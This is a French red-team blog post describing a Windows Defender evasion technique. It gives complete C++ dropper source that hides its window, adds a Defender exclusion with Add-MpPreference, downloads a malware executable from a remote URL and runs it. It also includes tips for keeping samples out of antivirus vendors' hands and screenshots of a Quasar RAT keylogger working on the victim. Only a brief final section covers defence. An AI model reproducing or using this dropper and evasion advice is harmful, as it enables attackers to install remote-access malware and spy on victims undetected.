---
published: true
layout: post
title: "Evasion de Windows Defender grâce à un injecteur (dropper)"
description: "Cet article décrit comment rendre indétectable n'importe quel malware auprès de Windows Defender."
lang: fr_FR
category: redteam,malware,raccourci,dropper,injecteur,evasion
---
![Evasion de Windows Defender grâce à un injecteur (dropper)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/illustration.PNG)

Un injecteur (ou *dropper*, en anglais), est un programme créé pour installer un logiciel malveillant sur un système cible.
Il s'agit d'une forme minimaliste de cheval de Troie. Le code du logiciel malveillant est soit inclus à même l'injecteur, soit téléchargé sur la machine à partir d'Internet une fois activé.

## Principe d'exploitation
PowerShell dispose d'une méthode [Add-MpPreference](https://docs.microsoft.com/en-us/powershell/module/defender/add-mppreference?view=win10-ps) qui permet d'intéragir directement avec Windows Defender.
Cette commande permet d'ajouter des exclusions sur les dossiers, fichiers, extensions.
C'est utile pour administrer un poste client par exemple mais peut être détournée de son utilité native.
L'idée est donc tout simplement d'ajouter une exception sur le malware. Le prérequis est d'avoir les droits d'exécuter un programme en tant qu'administrateur de la part de la victime.
Il sera alors possible d'exécuter et d'évader n'importe quel type de malware, quelque soit sont taux de détection original.

Pour l'exemple, j'utiliserai l'outil d'administration à distance (*Remote Administration Tool* ou *RAT*) [Quasar](https://github.com/quasar/Quasar) qui est libre et open source.

Le taux de détection original est le suivant :

[![Taux de détection du malware Quasar](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/scan_malware.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/scan_malware.PNG)

Attention, lors de la création d'un malware ou injecteur (*dropper*), il **ne doit jamais** être scanné sur les plateformes telles que [VirusTotal](https://www.virustotal.com/gui/) car les échantillons sont distribués aux **éditeurs antivirus**.
Les plateformes dites sans distribution (*no distribute*) telles que [AntiScanMe](https://antiscan.me/) sont à privilégier. Il serait bête de griller votre cartouche avant même de commencer votre audit Red Team :)

## Création du dropper en C++
L'étape suivante est la création de l'injecteur. J'ai choisi le language C++ mais il peut être fait au format .bat, .ps1 ou tout autre langage tant que PowerShell est exécuté.
Le code ne tient qu'en quatre étapes :
1. Masquer la fenêtre
2. Ajouter l'exclusion via PowerShell avec la commande `Add-MpPreference` et le paramètre `-ExclusionPath`
3. Télécharger le malware à l'endroit où a été ajoutée l'exclusion
4. Exécuter le malware téléchargé

Voici le code source de l'application :
```cpp
#include <iostream>
#include <Windows.h>

int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    system("powershell.exe -Command Add-MpPreference -ExclusionPath %appdata%\\malware.exe -Force");
    system("powershell.exe -Command Invoke-WebRequest -Uri https://github.com/CLeBeRFR/a/raw/main/malware.exe -OutFile %appdata%\\malware.exe");
    system("powershell.exe -Command Invoke-Item %appdata%\\malware.exe");
}
```
Le fichier manifest doit aussi être modifié via les paramètres du projet afin demander l'exécution de l'application en tant qu'administrateur.

Le taux de détection de l'injecteur est le suivant :

[![Taux de détection de l'injecteur (dropper)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/scan_dropper.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/scan_dropper.PNG)

La non détection de l'injecteur par Windows Defender est le seul élément qui est vraiment intéressant car l'injecteur sert uniquement à évader ce dernier.

Une fois l'injecteur envoyé à la victime, l'exclusion est correctement ajoutée et le malware pourtant initialement détecté par Windows Defender est exécuté. La victime apparaît alors du côté de l'attaquant :

[![Taux de détection de l'injecteur (dropper)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/Quasar.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/Quasar.PNG)

L'attaquant dispose alors de toutes les fonctionnalités du malware installé. Dans le cas présent, il est possible d'avoir un enregistreur de frappes (*keylogger*) :

[![Enregistreur de frappes (keylogger)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/keylogger.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/keylogger.PNG)

Il est également possible d'envoyer des messages à la victime :

[![Message box Quasar](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/message_box.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/message_box.PNG)

D'autres fonctionnalités sont disponibles et dépendent du logiciel malveillant installé, un ransomware aurait également pu être installé...

Si la vicitme se rend dans les paramètres, elle pourra voir l'exclusion ajoutée par l'injecteur :

[![Exclusion Windows Defender ajoutée par l'injecteur](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/exclusion.PNG)](/assets/images/2021-03-18-Evasion-Windows-Defender-injecteur-dropper/exclusion.PNG)

## Comment s'en protéger
Etant donné que cette technique nécessite les droits d'administration de la part de la victime, il convient de limiter au maximum la liste des comptes ayant le droit d'exécuter des programmes en tant qu'administrateur.
Fort heureusement, les postes clients des collaborateurs de grandes entreprises n'ont généralement pas une telle permission.

Par ailleurs, je pense que cette méthode est transposable aux différents anti virus en éditant les valeurs du registre ou la configuration des fichiers contenants les exclusions. La non utilisation de Windows Defender n'est donc pas un moyen de rémédiation.